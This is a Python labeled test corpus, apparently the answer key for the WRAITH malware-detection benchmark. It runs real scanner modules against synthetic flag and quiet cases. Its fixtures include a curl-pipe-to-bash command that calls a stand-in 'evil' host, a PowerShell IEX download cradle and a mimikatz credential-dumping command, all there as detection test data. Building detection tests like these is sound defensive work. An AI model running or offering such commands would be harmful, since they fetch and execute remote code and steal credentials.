"""
WRAITH detection benchmark - synthetic labeled corpus (the answer key).

READ THIS BEFORE ADDING A CASE
------------------------------
* NO live malware, ever. This corpus is committed to a public repo and must be
  safe to clone on any machine. Every "flag" case is a SYNTHETIC artifact (a
  hand-built double-extension name, a deterministic high-entropy blob, a crafted
  process dict, a package.json) that reproduces the *signal* WRAITH keys on,
  never a real weaponized sample. Detonation belongs nowhere near this repo.
* The corpus is READ-ONLY ground truth. Flipping an expected label is a claim
  about reality: justify it in the note.
* Every false positive we fix ships a `quiet` case here; every missed alert we
  fix ships a `flag` case. This is the wall that stops a fix from silently
  regressing.

Each Case runs REAL WRAITH scanner code (no reimplemented detection). The runner
per `kind` calls the actual module function and reports whether a positive
signal was produced. A module that cannot be imported in this environment
(e.g. yara, or a Windows-only dependency) yields SKIP, never a fake pass.
"""

import os
import random
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Tuple

# Make the sibling scanner modules importable (scanner/ is the parent dir).
_SCANNER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _SCANNER_DIR not in sys.path:
    sys.path.insert(0, _SCANNER_DIR)

# Result of running one case against real scanner code.
POSITIVE = "positive"  # the detector produced a finding / positive signal
NEGATIVE = "negative"  # the detector stayed quiet
SKIP = "skip"  # the detector could not run here (missing dependency)


@dataclass
class Case:
    id: str
    module: str
    expect: str  # "flag" (a real threat) or "quiet" (a benign artifact)
    kind: str  # selects the runner below
    payload: Any
    note: str


@dataclass
class CaseResult:
    case: Case
    status: str  # POSITIVE | NEGATIVE | SKIP
    detail: str = ""


# ── deterministic high-entropy bytes (no reliance on os.urandom so the corpus is
#    reproducible run to run) ────────────────────────────────────────────────
def _high_entropy_blob(nbytes: int = 8192, seed: int = 1337) -> bytes:
    rnd = random.Random(seed)
    return bytes(rnd.randrange(256) for _ in range(nbytes))


# ── Runners: each calls REAL scanner code and returns (status, detail) ────────
def _run_file_heuristics(payload: Dict[str, Any]) -> Tuple[str, str]:
    try:
        import heuristics
    except Exception as e:  # pragma: no cover - import guard
        return SKIP, f"import heuristics failed: {e}"
    with tempfile.TemporaryDirectory() as td:
        fp = os.path.join(td, payload["name"])
        data = payload["data"]
        Path(fp).write_bytes(data if isinstance(data, bytes) else data.encode())
        findings = heuristics.scan_file_heuristics(fp)
    if findings:
        subs = ",".join(sorted({f.get("subcategory", "?") for f in findings}))
        return POSITIVE, subs
    return NEGATIVE, ""


def _run_process(payload: Dict[str, Any]) -> Tuple[str, str]:
    try:
        import process_scanner
    except Exception as e:  # pragma: no cover
        return SKIP, f"import process_scanner failed: {e}"
    findings = process_scanner.analyze_process(payload, {})
    if findings:
        return POSITIVE, findings[0].get("subcategory", "?")
    return NEGATIVE, ""


def _run_npm(payload: str) -> Tuple[str, str]:
    try:
        import npm_check
    except Exception as e:  # pragma: no cover
        return SKIP, f"import npm_check failed: {e}"
    with tempfile.TemporaryDirectory() as td:
        fp = os.path.join(td, "package.json")
        Path(fp).write_text(payload)
        findings = npm_check._check_package_json(fp)
    if findings:
        return POSITIVE, findings[0].get("subcategory", "?")
    return NEGATIVE, ""


def _run_event(payload: str) -> Tuple[str, str]:
    try:
        import event_parser
    except Exception as e:  # pragma: no cover
        return SKIP, f"import event_parser failed: {e}"
    hit, kw = event_parser._keyword_check(payload)
    return (POSITIVE, kw) if hit else (NEGATIVE, "")


def _run_ioc(payload: Dict[str, Any]) -> Tuple[str, str]:
    # positive == the enricher extracts an indicator (so it is NOT silently
    # dropped from ThreatFox/MalwareBazaar corroboration).
    try:
        import ioc_enricher
    except Exception as e:  # pragma: no cover
        return SKIP, f"import ioc_enricher failed: {e}"
    ind = ioc_enricher._extract_indicator(payload)
    return (POSITIVE, str(ind)) if ind else (NEGATIVE, "")


def _run_network_conn(payload: Dict[str, Any]) -> Tuple[str, str]:
    # Drive the REAL scan_connections classifier with a synthetic connection by
    # monkeypatching the enumeration entrypoint.
    try:
        import network_scanner
    except Exception as e:  # pragma: no cover
        return SKIP, f"import network_scanner failed: {e}"
    original = network_scanner._get_connections
    try:
        network_scanner._get_connections = lambda: [payload["conn"]]
        findings: List[Dict] = []
        network_scanner.scan_connections(findings, payload["pid_map"])
    finally:
        network_scanner._get_connections = original
    if findings:
        return POSITIVE, findings[0].get("subcategory", "?")
    return NEGATIVE, ""


def _run_ransom_ext(payload: str) -> Tuple[str, str]:
    try:
        import ransomware_scanner as rw
    except Exception as e:  # pragma: no cover
        return SKIP, f"import ransomware_scanner failed: {e}"
    ext = Path(payload).suffix.lower()
    return (POSITIVE, ext) if ext in rw.RANSOM_EXTENSIONS else (NEGATIVE, ext)


def _run_ransom_note(payload: str) -> Tuple[str, str]:
    try:
        import ransomware_scanner as rw
    except Exception as e:  # pragma: no cover
        return SKIP, f"import ransomware_scanner failed: {e}"
    return (
        (POSITIVE, payload)
        if payload.lower() in rw.RANSOM_NOTE_NAMES
        else (NEGATIVE, payload)
    )


def _run_yara(payload: Dict[str, Any]) -> Tuple[str, str]:
    # Optional: needs the yara module + compiled rules. Skips cleanly when absent
    # so CI on a runner without yara reports SKIP rather than a false pass.
    try:
        import yara_scanner  # noqa: F401
        import yara  # noqa: F401
    except Exception as e:  # pragma: no cover
        return SKIP, f"yara unavailable: {e}"
    import yara_scanner

    rules = yara_scanner.load_rules(Path(payload["rules_dir"]))
    if rules is None:
        return SKIP, "no rules compiled"
    with tempfile.TemporaryDirectory() as td:
        fp = os.path.join(td, payload["name"])
        Path(fp).write_bytes(payload["data"])
        findings = yara_scanner.scan_file_yara(rules, fp)
    return (POSITIVE, "match") if findings else (NEGATIVE, "")


RUNNERS: Dict[str, Callable[[Any], Tuple[str, str]]] = {
    "file_heuristics": _run_file_heuristics,
    "process": _run_process,
    "npm": _run_npm,
    "event": _run_event,
    "ioc": _run_ioc,
    "network_conn": _run_network_conn,
    "ransom_ext": _run_ransom_ext,
    "ransom_note": _run_ransom_note,
    "yara": _run_yara,
}


def run_case(case: Case) -> CaseResult:
    runner = RUNNERS.get(case.kind)
    if runner is None:
        return CaseResult(case, SKIP, f"no runner for kind={case.kind}")
    try:
        status, detail = runner(case.payload)
    except Exception as e:  # a runner crash is a real failure signal, not a pass
        return CaseResult(case, SKIP, f"runner error: {e}")
    return CaseResult(case, status, detail)


# ── The corpus ────────────────────────────────────────────────────────────────
# Grouped by the audit finding each case guards. `flag` = must catch,
# `quiet` = must stay silent.
CORPUS: List[Case] = [
    # ── heuristics: suspicious strings / packing / disguise ──────────────────
    Case(
        "heur-injection-strings",
        "heuristics",
        "flag",
        "file_heuristics",
        {
            "name": "loader.exe",
            "data": b"stub"
            + b"CreateRemoteThread"
            + b"..VirtualAllocEx..WriteProcessMemory..",
        },
        "Process-injection API strings must trigger suspicious_string.",
    ),
    Case(
        "heur-double-extension",
        "heuristics",
        "flag",
        "file_heuristics",
        {"name": "invoice.pdf.exe", "data": b"MZ harmless body"},
        "Double-extension disguise must trigger double_extension.",
    ),
    Case(
        "heur-high-entropy",
        "heuristics",
        "flag",
        "file_heuristics",
        {"name": "packed.exe", "data": _high_entropy_blob()},
        "A high-entropy .exe (packed/encrypted) must trigger high_entropy.",
    ),
    Case(
        "heur-clean-text",
        "heuristics",
        "quiet",
        "file_heuristics",
        {"name": "notes.txt", "data": b"Shopping list: milk, eggs, bread.\n"},
        "An ordinary text file must not be flagged.",
    ),
    Case(
        "heur-clean-dll",
        "heuristics",
        "quiet",
        "file_heuristics",
        {"name": "helper.dll", "data": b"clean utility library, no bad strings\n" * 8},
        "A low-entropy library with no suspicious strings must stay quiet.",
    ),
    # ── process: masquerade + LOLBin (audit: name-only allowlist, pipe-to-shell)
    Case(
        "proc-masquerade-svchost",
        "processes",
        "flag",
        "process",
        {
            "ProcessId": 6001,
            "Name": "svchost.exe",
            "ExecutablePath": r"C:\Users\bob\AppData\Roaming\svchost.exe",
        },
        "svchost.exe outside System32 is a masquerade; must not be trusted by name.",
    ),
    Case(
        "proc-pipe-to-shell",
        "processes",
        "flag",
        "process",
        {
            "ProcessId": 6002,
            "Name": "cmd.exe",
            "ExecutablePath": r"C:\Apps\tool.exe",
            "CommandLine": "cmd /c curl http://evil/x.sh | bash",
        },
        "Download piped to a shell must fire (old regex-shaped pattern never matched).",
    ),
    Case(
        "proc-known-tool-name",
        "processes",
        "flag",
        "process",
        {
            "ProcessId": 6003,
            "Name": "mimikatz.exe",
            "ExecutablePath": r"C:\Users\bob\Desktop\mimikatz.exe",
        },
        "Known offensive tool name must fire.",
    ),
    Case(
        "proc-clean-system-svchost",
        "processes",
        "quiet",
        "process",
        {
            "ProcessId": 900,
            "Name": "svchost.exe",
            "ExecutablePath": r"C:\Windows\System32\svchost.exe",
        },
        "Legitimate System32 svchost.exe must stay quiet.",
    ),
    Case(
        "proc-clean-chrome",
        "processes",
        "quiet",
        "process",
        {
            "ProcessId": 901,
            "Name": "chrome.exe",
            "ExecutablePath": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "CommandLine": "chrome.exe --type=renderer",
        },
        "An ordinary browser process must stay quiet.",
    ),
    # ── npm supply chain (audit: substring version match) ────────────────────
    Case(
        "npm-compromised-exact",
        "npm",
        "flag",
        "npm",
        '{"name":"app","version":"1.0.0","dependencies":{"event-stream":"3.3.6"}}',
        "A pinned known-compromised version must fire.",
    ),
    Case(
        "npm-patched-version-quiet",
        "npm",
        "quiet",
        "npm",
        '{"name":"app","version":"1.0.0","dependencies":{"semver":"7.5.10"}}',
        "Patched 7.5.10 must NOT match the vulnerable 7.5.1 (substring-version fix).",
    ),
    Case(
        "npm-clean-deps",
        "npm",
        "quiet",
        "npm",
        '{"name":"app","version":"1.0.0","dependencies":{"express":"^4.18.2","lodash":"^4.17.21"}}',
        "Ordinary popular dependencies must stay quiet.",
    ),
    # ── event-log keywords (audit: iex matched iexplore) ─────────────────────
    Case(
        "event-iex-cradle",
        "events",
        "flag",
        "event",
        "powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString('http://x')",
        "A real IEX download cradle must fire.",
    ),
    Case(
        "event-mimikatz",
        "events",
        "flag",
        "event",
        "Command: mimikatz sekurlsa::logonpasswords",
        "Credential-dumping keyword must fire.",
    ),
    Case(
        "event-iexplore-quiet",
        "events",
        "quiet",
        "event",
        "Application iexplore.exe (Internet Explorer) started successfully",
        "iexplore.exe must NOT match the 'iex' keyword (substring fix).",
    ),
    Case(
        "event-benign-quiet",
        "events",
        "quiet",
        "event",
        "User opened Microsoft Word document report.docx",
        "An ordinary application event must stay quiet.",
    ),
    # ── IOC extraction routing (audit: all of 172.* skipped) ─────────────────
    Case(
        "ioc-public-172",
        "intel",
        "flag",
        "ioc",
        {"path": "outbound to 172.104.5.5:443", "reason": "beacon", "title": "C2"},
        "A public 172.x address must be extractable for enrichment (172/12 fix).",
    ),
    Case(
        "ioc-public-generic",
        "intel",
        "flag",
        "ioc",
        {"path": "", "reason": "callback to 185.220.101.5", "title": "beacon"},
        "A public address must be extracted for enrichment.",
    ),
    Case(
        "ioc-private-16",
        "intel",
        "quiet",
        "ioc",
        {"path": "", "reason": "internal host 172.16.4.4", "title": "lan"},
        "A genuinely private 172.16/12 address must be skipped.",
    ),
    Case(
        "ioc-loopback",
        "intel",
        "quiet",
        "ioc",
        {"path": "", "reason": "localhost 127.0.0.1", "title": "self"},
        "Loopback must be skipped.",
    ),
    # ── network C2 ports (audit: 8080/8443 flagged for any process) ──────────
    Case(
        "net-c2-4444",
        "network",
        "flag",
        "network_conn",
        {
            "conn": {
                "RemoteAddress": "45.9.9.9",
                "RemotePort": 4444,
                "LocalPort": 51000,
                "State": "Established",
                "OwningProcess": 7001,
            },
            "pid_map": {7001: "rundll32"},
        },
        "Outbound to an unambiguous RAT port must fire.",
    ),
    Case(
        "net-clean-8443",
        "network",
        "quiet",
        "network_conn",
        {
            "conn": {
                "RemoteAddress": "8.8.8.8",
                "RemotePort": 8443,
                "LocalPort": 52000,
                "State": "Established",
                "OwningProcess": 7002,
            },
            "pid_map": {7002: "chrome"},
        },
        "A browser to an :8443 HTTPS endpoint must NOT be flagged as C2.",
    ),
    # ── ransomware extension + notes (audit: case + benign collisions) ───────
    Case(
        "ransom-ryk",
        "ransomware",
        "flag",
        "ransom_ext",
        "family_photos.jpg.ryk",
        "A .ryk (Ryuk) encrypted file must match (case-normalization fix).",
    ),
    Case(
        "ransom-clop",
        "ransomware",
        "flag",
        "ransom_ext",
        "q4_report.xlsx.clop",
        "A .clop encrypted file must match.",
    ),
    Case(
        "ransom-mp3-quiet",
        "ransomware",
        "quiet",
        "ransom_ext",
        "song.mp3",
        "An .mp3 must NOT be a ransomware indicator (benign-collision fix).",
    ),
    Case(
        "ransom-note-flag",
        "ransomware",
        "flag",
        "ransom_note",
        "how_to_decrypt.txt",
        "A distinctive ransom-note name must match.",
    ),
    Case(
        "ransom-readme-quiet",
        "ransomware",
        "quiet",
        "ransom_note",
        "readme.txt",
        "readme.txt must NOT be treated as a ransom note (benign-collision fix).",
    ),
]
